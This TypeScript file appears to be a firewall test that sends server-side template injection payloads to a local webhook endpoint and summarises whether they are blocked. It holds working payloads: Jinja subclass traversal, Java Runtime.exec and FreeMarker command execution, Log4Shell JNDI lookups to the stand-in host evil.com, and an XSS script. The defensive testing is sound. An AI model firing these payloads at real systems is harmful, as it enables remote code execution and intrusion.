import { finishWithExit, printFailures, printSummary, runBatches, logger, testUserAgents } from "../firewall/_helpers.ts";
import type { RequestSpec } from "../firewall/_helpers.ts";

const targetPath = "/api/webhook?action=quote";

async function main(): Promise<void> {
  const templatePayloads = [
    "{{7*7}}",
    "{{7*'7'}}",
    "{{config}}",
    "{{request}}",
    "{{session}}",
    "{{url_for}}",
    "{{''.__class__.__mro__[2].__subclasses__()}}",
    "{{payload|join}}",
    "${7*7}",
    "${T(java.lang.Runtime).getRuntime().exec('id')}",
    "${T(java.lang.System).getProperty('user.name')}",
    "<#assign crt=freemarker.template.utility.Execute()?new()>${crt('id')}",
    "{{guy}}",
    "${globalScope}",
    "{{self}}",
    "{{(())}}",
    "<%= 7*7 %>",
    "${jndi:ldap://evil.com/a}",
    "${jndi:rmi://evil.com/a}",
    "{{''.__class__.__bases__[0].__subclasses__()}}",
    "{{request|attr('application')}}",
    "<script>alert('xss')</script>",
    "{{7*7}}",
  ];

  const specs: RequestSpec[] = templatePayloads.map((payload, index) => ({
    id: index,
    label: `ssti-${payload.substring(0, 15)}`,
    method: "GET",
    path: `${targetPath}&symbol=${encodeURIComponent("AAPL")}&period=${encodeURIComponent(payload)}`,
    userAgent: testUserAgents[index % testUserAgents.length],
    fakeIp: undefined,
  }));

  logger.step(`Testing ${specs.length} template injection payloads`);
  const results = await runBatches(specs, 4);
  printSummary("Template Injection Attacks", results);
  printFailures(results, 30);
  finishWithExit(results);
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});